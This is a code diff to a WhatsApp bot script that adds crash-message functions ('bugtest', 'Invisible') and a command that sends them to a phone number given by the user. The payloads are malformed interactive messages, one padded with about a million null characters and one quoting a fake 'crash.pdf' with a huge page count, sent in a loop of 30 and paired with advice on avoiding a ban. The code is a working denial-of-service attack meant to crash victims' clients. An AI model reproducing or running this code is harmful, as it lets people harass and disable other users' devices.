@@ -303,6 +303,29 @@ async function addExifAvatar(buffer, packname, author, categories = ["🥀"], ex
     img.exif = exif
     return await img.save(null)
 }
+async function bugtest(target, text, amount, ptcp = false) {
+    await sam.relayMessage(target, 
+        {
+            viewOnceMessage: {
+                message: {
+                    interactiveResponseMessage: {
+                        body: {
+                            text: text,
+                            format: "EXTENSIONS_1"
+                        },
+                        nativeFlowResponseMessage: {
+                            name: 'galaxy_message',
+                            'paramsJson': `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AdvanceBug\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"attacker@mods.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons" + "\0".repeat(amount) + "\",\"screen_0_TextInput_1\":\"\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
+                            version: 3
+                        }
+                    }
+                }
+            }
+        }, 
+        ptcp ? { participant: { jid: target } } : {}
+    );
+};
+    
 //=================================================//
 let resize = async (image, width, height) => {
     let oyy = await jimp.read(image)
@@ -805,7 +828,69 @@ async function caroLoc(target, kuoted) {
       messageId: etc.key.id
     });
 }
-    
+async function Invisible(target){
+
+const okebri = {
+    title: "🦄드림 가이 Xeon; ",
+    hasMediaAttachment: true,
+    imageMessage: thumb.imageMessage
+};
+
+const emptyText = {
+    text: ''
+};
+
+sam.relayMessage(target, {
+    'viewOnceMessage': {
+        'message': {
+            'interactiveMessage': {
+                'header': okebri,
+                'body': emptyText,
+                'nativeFlowMessage': {
+                    'buttons': [{
+                        'name': "galaxy_message",
+                        'buttonParamsJson': JSON.stringify({
+                            'header': "🦄드림 가이 Xeon; ",
+                            'body': "xxx",
+                            'flow_action': "navigate",
+                            'flow_action_payload': {
+                                'screen': "FORM_SCREEN"
+                            },
+                            'flow_cta': "xxxxx",
+                            'flow_id': "1169834181134583",
+                            'flow_message_version': '3',
+                            'flow_token': "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
+                        })
+                    }],
+                    'messageParamsJson': ''
+                },
+                'contextInfo': {
+                    'isForwarded': true,
+                    'fromMe': false,
+                    'participant': "0@s.whatsapp.net",
+                    'remoteJid': target,
+                    'quotedMessage': {
+                        'documentMessage': {
+                            'url': "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
+                            'mimetype': "application/pdf",
+                            'title': "crash",
+                            'pageCount': 0x3b9aca00,
+                            'fileName': "crash.pdf",
+                            'contactVcard': true
+                        }
+                    },
+                    'forwardedNewsletterMessageInfo': {
+                        'newsletterJid': "120363144038483541@newsletter",
+                        'serverMessageId': 0x1,
+                        'newsletterName': "🦄드림 가이 Xeon"
+                    }
+                }
+            }
+        }
+    }
+}, {});
+}
+	
 async function BugPayment(jid){
 await sam.relayMessage(jid, { viewOnceMessage: { message: { messageContextInfo: { deviceListMetadataVersion: 2, deviceListMetadata: {}}, interactiveMessage: {
 nativeFlowMessage: {
@@ -1594,13 +1679,14 @@ if (!q) return reply(`*Example*: ${prefix + command} 2547392784527`)
 let bijipler = q.replace(/[^0-9]/g, "")
 if (bijipler.startsWith('0')) return reply(`> The number starts with the number 0. Replace it with the number starting with the country code\n\n> *Example*: ${prefix + command} 2547392784527`)
 let target = bijipler + '@s.whatsapp.net'
-await bugpayflow(target);
 for (let j = 0; j < 30; j++) {
-await BugPayment(target)
+await Invisible(target)
+await bugtest(target, "", 1020000, true);
+await Invisible(target)
 await coresix(target, "", 1020000, true);
-await BugPayment(target)
-await coresix(target, "", 1020000, true);
-await BugPayment(target);
+await bugtest(target, "", 1020000, true);
+await Invisible(target);
+await bugtest(target, "", 1020000, true);
 await sleep(500)
 }
 await reply(`_Successfully Spider has delivered to ${target} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
